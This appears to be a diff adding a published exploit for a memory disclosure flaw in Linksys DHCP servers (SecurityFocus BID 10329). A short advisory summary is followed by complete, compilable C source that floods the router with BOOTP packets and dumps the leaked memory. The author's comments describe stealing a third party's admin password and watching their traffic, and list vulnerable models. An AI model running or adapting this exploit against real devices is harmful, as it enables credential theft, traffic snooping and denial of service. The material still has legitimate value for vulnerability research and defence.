@@ -1,0 +1,414 @@
+source: http://www.securityfocus.com/bid/10329/info
+
+It has been reported that the built-in DHCP server on these devices are prone to an information disclosure vulnerability. When attempting to exploit this issue, it has been reported that a denial of service condition may occur, stopping legitimate users from using the device.
+
+The DHCP server application on the device reportedly does not handle BOOTP packets properly, and can disclose the contents of the devices memory to an attacker. It may be possible for an attacker to use this vulnerability to watch traffic on an affected device. It may also be possible for an attacker to crash the device and deny service to legitimate users.
+
+/*
+ *
+ * Apparently Linksys devices that have a DHCP server on them
+ * don't properly handle BOOTP packets.  Instead of returning
+ * legitimate BOOTP responses, they  return BOOTP responses with
+ * the BOOTP fields filled in with portions of memory.  This
+ * allows you to do cool things like the equivalent of sniffing
+ * all the traffic to/from the device.
+ *
+ * To the best of my knowledge, this only allows you to read
+ * traffic that was recently sent to/from the linksys device 
+ * (on any of its ports if its a hub/switch).  I have successfully
+ * used this technique to steal the admin username and password
+ * from an innocent third party who recently configured the device,
+ * and I watched someone's traffic as they browsed ebay for a new 
+ * Ti-Book.  In a number of cases, after sufficient packets were sent,
+ * the device stopped routing packets and would only continue working
+ * again after a power cycle.
+ *
+ * You won't always get memory on the first packet, so try
+ * sending many packets.  Even if you do get portions of memory,
+ * you'll only get something interesting if the linksys device was 
+ * recently active.
+ *
+ * If you try the payload option, you can see that canary value in 
+ * BOOTP reply packets -- not necessarily right away, but eventually.  
+ * This usually appears in the BOOTP vendor specific options field,
+ * typically right at the very beginning.
+ *
+ * Tested on a fully updated Linksys BEFSR41 and BEFW11S4, but 
+ * will likely work on all Linksys devices that have a DHCP
+ * server.  Currently, this looks to include at least the BEFN2PS4, 
+ * BEFSR41, BEFSR81, BEFSX41, RV082, BEFCMU10, BEFSR11, BEFSR41W,
+ * BEFSRU31, BEFVP41, WRT55AG, WRV54G, WRT51AB
+ * 
+ *
+ * Requires libnet (1.1.x) and libpcap
+ *
+ * Compile with something like:
+ *
+ * gcc -Wall -I/usr/include `libnet-config --defines --cflags` \
+ * -o linksys-dhcp-exploit linksys-dhcp-exploit.c `libnet-config --libs` -lpcap
+ * 
+ *
+ * Jon Hart <warchild@spoofed.org>
+ *
+ * Copyright (c) 2004, Jon Hart 
+ * All rights reserved.
+ *
+ *  Redistribution and use in source and binary forms, with or without modification, 
+ *  are permitted provided that the following conditions are met:
+ *
+ *  * Redistributions of source code must retain the above copyright notice, 
+ *    this list of conditions and the following disclaimer.
+ *  * Redistributions in binary form must reproduce the above copyright notice, 
+ *    this list of conditions and the following disclaimer in the documentation 
+ *    and/or other materials provided with the distribution.
+ *  * Neither the name of the organization nor the names of its contributors may
+ *    be used to endorse or promote products derived from this software without 
+ *    specific prior written permission.
+ *
+ *
+ *  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" 
+ *  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE 
+ *  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE 
+ *  ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE 
+ *  LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL 
+ *  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
+ *  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER 
+ *  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, 
+ *  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE 
+ *  USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+ *
+ */
+
+#include <libnet.h>
+#include <pcap.h>
+#if (SOLARIS || BSD)
+#include <netinet/if_ether.h>
+#else
+#include <netinet/ether.h>
+#endif
+
+#define HEXDUMP_BYTES_PER_LINE 16
+#define HEXDUMP_SHORTS_PER_LINE (HEXDUMP_BYTES_PER_LINE / 2)
+#define HEXDUMP_HEXSTUFF_PER_SHORT 5 /* 4 hex digits and a space */
+#define HEXDUMP_HEXSTUFF_PER_LINE \
+            (HEXDUMP_HEXSTUFF_PER_SHORT * HEXDUMP_SHORTS_PER_LINE)
+
+void ascii_print_with_offset(register const u_char *cp, register u_int length);
+void usage();
+void print_pkt(u_char *blah, const struct pcap_pkthdr* packet_header, const u_char *packet);
+
+int main(int argc, char *argv[]) {
+
+	int c, time = 5, dump = 0, count = 0;
+
+	libnet_t *libnet;
+	struct libnet_stats stats_libnet;
+	libnet_ptag_t ether, ipv4, udp, bootp;
+	struct libnet_ether_addr *src_ether;
+
+	pcap_t *pcap;
+	struct pcap_stat stats_pcap;
+	struct bpf_program filter;
+	char filter_exp[] = "src port 67 and dst port 68";
+	bpf_u_int32 mask, net;
+
+	char errbuf[LIBNET_ERRBUF_SIZE];
+	char *interface = NULL;
+	char *payload = NULL;
+	u_char bcast_ether[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
+
+	while ((c = getopt(argc, argv, "c:i:p:s:X")) != EOF) {
+		switch (c) {
+			case 'c':
+					count = atoi(optarg);
+					break;
+			case 'i':
+				interface = optarg;
+				break;
+			case 'p':
+				payload = optarg;
+				break;
+			case 's':
+				time = atoi(optarg);
+				break;
+			case 'X':
+				dump = 1;
+				break;
+			default:
+				 usage();
+				 return(1);
+		}
+	}
+
+
+	if (interface == NULL) {
+			fprintf(stderr, "Please specify an interface\n");
+			usage();
+			return(1);
+	}
+
+	if ((libnet = libnet_init(LIBNET_LINK, interface, errbuf)) == NULL) {
+		fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
+		return(1);
+	}
+
+	if ((src_ether = libnet_get_hwaddr(libnet)) == NULL) {
+		fprintf(stderr, "Couldn't determine src ethernet: %s\n", errbuf);
+		libnet_destroy(libnet);
+		return(1);
+	}
+
+	memset(&stats_libnet, 0, sizeof(struct libnet_stats));
+
+	libnet_seed_prand(libnet);
+	
+	if ((pcap = pcap_open_live(interface, BUFSIZ, 0, 5000, errbuf)) == NULL) {
+		fprintf(stderr, "pcap_open_live() failed: %s\n", errbuf);
+		libnet_destroy(libnet);
+		return(1);
+	}
+
+	if (pcap_lookupnet(interface, &net, &mask, errbuf) == -1) {
+		fprintf(stderr, "pcap_lookupnet() failed: %s\n", errbuf);
+		libnet_destroy(libnet);
+		pcap_close(pcap);
+		return(1);
+	}
+
+	if (pcap_compile(pcap, &filter, filter_exp, 0, net) == -1) {
+		fprintf(stderr, "pcap_compile() failed: %s\n", pcap_geterr(pcap));
+		libnet_destroy(libnet);
+		pcap_close(pcap);
+	}
+
+	if (pcap_setfilter(pcap, &filter) == -1) {
+		fprintf(stderr, "pcap_setfilter() failed: %s\n", pcap_geterr(pcap));
+		libnet_destroy(libnet);
+		pcap_freecode(&filter);
+		pcap_close(pcap);
+	}
+
+	memset(&stats_pcap, 0, sizeof(struct pcap_stat));
+
+	/* If we want to tack some "payload" into the BOOTP packet, 
+	 * we must do it here before the bootp stuff is built
+	 */
+	if (!(payload == NULL)) {
+			libnet_build_data((u_char *) payload, strlen(payload), libnet, 0);
+	}
+
+	/* The device seems to croak on the simplest of BOOTP packets,
+	 * so lets do that, shall we
+	 */
+	bootp = libnet_build_bootpv4(
+				LIBNET_DHCP_REQUEST,
+				1,
+				ETHER_ADDR_LEN,
+				0,
+				libnet_get_prand(LIBNET_PR32),
+				0,
+				0x8000,
+				0,
+				0,
+				0,
+				0,
+				src_ether->ether_addr_octet,
+				NULL,
+				NULL,
+				NULL,
+				0,
+				libnet,
+				0);
+
+	if (bootp == -1) {
+		fprintf(stderr, "Can't build bootp: %s\n", libnet_geterror(libnet));
+		goto die;
+	}
+
+	udp = libnet_build_udp(
+			68,
+			67,
+			LIBNET_UDP_H + LIBNET_DHCPV4_H + (payload == NULL ? 0 : strlen(payload)),
+			0,
+			NULL,
+			0,
+			libnet,
+			0);
+
+
+	if (udp == -1) {
+		fprintf(stderr, "Can't build udp: %s\n", libnet_geterror(libnet));
+		goto die;
+	}
+
+	ipv4 = libnet_build_ipv4(
+				LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_DHCPV4_H + (payload == NULL ? 0 : strlen(payload)),
+				0,
+				libnet_get_prand(LIBNET_PR16),
+				IP_DF,
+				libnet_get_prand(LIBNET_PR8),
+				IPPROTO_UDP,
+				0,
+				inet_addr("0.0.0.0"),
+				inet_addr("255.255.255.255"),
+				NULL,
+				0,
+				libnet,
+				0);
+
+	if (ipv4 == -1) {
+			fprintf(stderr, "Can't build ipv4: %s\n", libnet_geterror(libnet));
+			goto die;
+	}
+
+	ether = libnet_autobuild_ethernet(bcast_ether, ETHERTYPE_IP, libnet);	
+
+	if (ether == -1) {
+			fprintf(stderr, "Can't build ethernet: %s\n", libnet_geterror(libnet));
+			goto die;
+	}
+
+	if (count == 0) {
+		for(;;) {
+			libnet_write(libnet);
+			if (dump) {
+				if (pcap_dispatch(pcap, 1, print_pkt, NULL) <= 0) {
+					pcap_perror(pcap, "Error: ");
+				}
+			}
+			sleep(time);
+		}
+	} else {
+		for (c = 0; c < count; c++) { 
+			libnet_write(libnet);
+			if (dump) {
+				if (pcap_dispatch(pcap, 1, print_pkt, NULL) <= 0) {
+					pcap_perror(pcap, "Error: ");
+				}
+			}
+			if (!(c + 1 == count)) {
+				sleep(time);
+			}
+		}
+	}
+
+	libnet_stats(libnet, &stats_libnet);
+	
+	if (pcap_stats(pcap, &stats_pcap) == -1) {
+		fprintf(stderr, "pcap_stats() failed: %s\n", pcap_geterr(pcap));
+	} else {
+		fprintf(stderr, "\nSent: %lld Received: %d Dropped: %d\n",
+				stats_libnet.packets_sent, stats_pcap.ps_recv, stats_pcap.ps_drop);
+	}
+
+	goto die;
+
+die:
+	libnet_destroy(libnet);
+	pcap_freecode(&filter);
+	pcap_close(pcap);
+	return(0);
+}
+
+/* Borrowed from tcpdump */
+void ascii_print_with_offset(register const u_char *cp, register u_int length) {
+	register u_int i, oset = 0;
+	register int s1, s2, chr = 0;
+	register int nshorts;
+	char hexstuff[HEXDUMP_SHORTS_PER_LINE*HEXDUMP_HEXSTUFF_PER_SHORT+1], *hsp;
+	char asciistuff[HEXDUMP_BYTES_PER_LINE+1], *asp;
+	char *ascii_color = "01;32";
+
+	nshorts = length / sizeof(u_short);
+	i = 0;
+	hsp = hexstuff; asp = asciistuff;
+	while (--nshorts >= 0) {
+		s1 = *cp++;
+		s2 = *cp++;
+		(void)snprintf(hsp, sizeof(hexstuff) - (hsp - hexstuff),
+							" %02x%02x", s1, s2);
+		hsp += HEXDUMP_HEXSTUFF_PER_SHORT;
+		*(asp++) = s1;
+		*(asp++) = s2;
+		if (++i >= HEXDUMP_SHORTS_PER_LINE) {
+			*hsp = *asp = '\0';
+			(void)printf("\n0x%04x\t%-*s ",
+			oset, HEXDUMP_HEXSTUFF_PER_LINE,
+			hexstuff);
+			for (chr = 0; chr < sizeof(asciistuff) - 1; chr++) {
+				if (isprint(asciistuff[chr])) {
+					(void)printf("\33[%sm", ascii_color);
+					(void)printf("%c", asciistuff[chr]);
+					fputs("\33[00m", stdout);
+				} else {
+					(void)printf(".");
+				}
+			}
+			i = 0; hsp = hexstuff; asp = asciistuff;
+			oset += HEXDUMP_BYTES_PER_LINE;
+		}
+	}
+	if (length & 1) {
+		s1 = *cp++;
+		(void)snprintf(hsp, sizeof(hexstuff) - (hsp - hexstuff),
+							" %02x", s1);
+		hsp += 3;
+		*(asp++) = s1;
+		++i;
+	}
+	if (i > 0) {
+		*hsp = *asp = '\0';
+		(void)printf("\n0x%04x\t%-*s ",
+						oset, HEXDUMP_HEXSTUFF_PER_LINE,
+						hexstuff);
+		for (chr = 0; chr < sizeof(asciistuff) - 1 && asciistuff[chr] != '\0'; chr++) {
+			if (isgraph(asciistuff[chr])) {
+				(void)printf("\33[%sm", ascii_color);
+				(void)printf("%c", asciistuff[chr]);
+				fputs("\33[00m", stdout);
+			} else {
+				(void)printf(".");
+			}
+		}
+	}
+}
+
+void usage() {
+	fprintf(stderr, "\tLinksys dhcp memory disclosure exploit\n");
+	fprintf(stderr, "\tby Jon Hart <warchild@spoofed.org>\n");
+	fprintf(stderr, "\thttp://spoofed.org/files/linksys-dhcp-exploit.c\n");
+	fprintf(stderr, "\n\tUsage:\n");
+	fprintf(stderr, "\t\t-c count  # number of packets to send\n");
+	fprintf(stderr, "\t\t-i interface  # interface to send packets to\n");
+	fprintf(stderr, "\t\t-p payload # payload to put in the bootp packet\n");
+	fprintf(stderr, "\t\t-s seconds  # (optional) seconds to sleep between packets\n");
+	fprintf(stderr, "\t\t-X   # dump captured data\n");
+	fprintf(stderr, "\n\n");
+}
+
+void print_pkt(u_char *blah, const struct pcap_pkthdr* packet_header, const u_char *packet) {
+
+	struct ether_header *ether = (struct ether_header *) packet;
+	struct iphdr *ip;
+	u_int jump = 0;
+
+	if (ntohs(ether->ether_type) != ETHERTYPE_IP) {
+		return;
+	}
+
+	/* Jump past the ethernet header */
+	jump += LIBNET_ETH_H;
+	ip = (struct iphdr *)(packet + jump);
+
+	/* Jump past the IP header */
+	jump += ip->ihl * 4;
+
+	/* Jump past the UDP header */
+	jump += LIBNET_UDP_H;
+
+	/* Now print out the UDP data, which is just the BOOTP portion of 
+	 * the packet.  This should contain the interesting data.
+	 */
+	ascii_print_with_offset(packet + jump, packet_header->caplen - jump);
+	printf("\n");
+}
